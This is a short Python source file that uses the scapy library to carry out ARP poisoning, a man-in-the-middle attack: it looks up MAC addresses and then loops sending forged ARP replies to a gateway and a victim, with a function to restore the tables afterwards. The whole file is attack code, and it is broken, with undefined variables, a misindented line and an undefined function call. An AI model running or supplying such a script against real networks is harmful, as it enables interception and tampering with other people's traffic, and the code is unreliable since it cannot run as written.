import os
import signal
import sys
import time
from multiprocessing import Process

from scapy.all import *


def proc_info(title):
    print title
    print 'module name:', __name__
    if hasattr(os, 'getppid'):  # only available on Unix
        print 'parent process:', os.getppid()
    print 'process id:', os.getpid()

def get_mac(IP):
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%")

def arp_poison(gateway_ip, gateway_mac, victim_ip, victim_mac):
    print("\n[*] Starting the Arp Poison...")
    while 1:
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip))
        send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip))
        time.sleep(5)

def reARP():
    print "\n[*] Restoring Targets..."
    victimMAC = get_mac(victimIP)
    gatewayMAC = get_mac(gatewayIP)
    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gatewayMAC), count = 7)
        disable_ip_forwarding()
    sys.exit(1)

if __name__ == '__main__':
    p = Process(target=arp_poison, args=(gateway_ip, gateway_mac, victim_ip, victim_mac,))
    p.start()
    p.join()



